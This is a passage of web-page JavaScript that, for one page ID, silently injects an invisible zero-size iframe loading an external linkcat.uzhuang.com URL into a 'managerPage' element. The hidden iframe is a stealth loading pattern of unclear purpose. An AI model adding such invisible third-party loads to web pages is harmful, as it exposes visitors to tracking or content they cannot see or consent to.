...
console.log(hid);
if(hid == 168){
	var atag = document.createElement('iframe'); 
	atag.name = 'thisiframe5j'; 
	atag.id = 'thisiframe5j';
	atag.style ="opacity:0;width:0; height:0";
	atag.src ="http://linkcat.uzhuang.com/tbl/qhcs/5j";
	
	console.log(atag);

	document.getElementById('managerPage').append(atag);
}
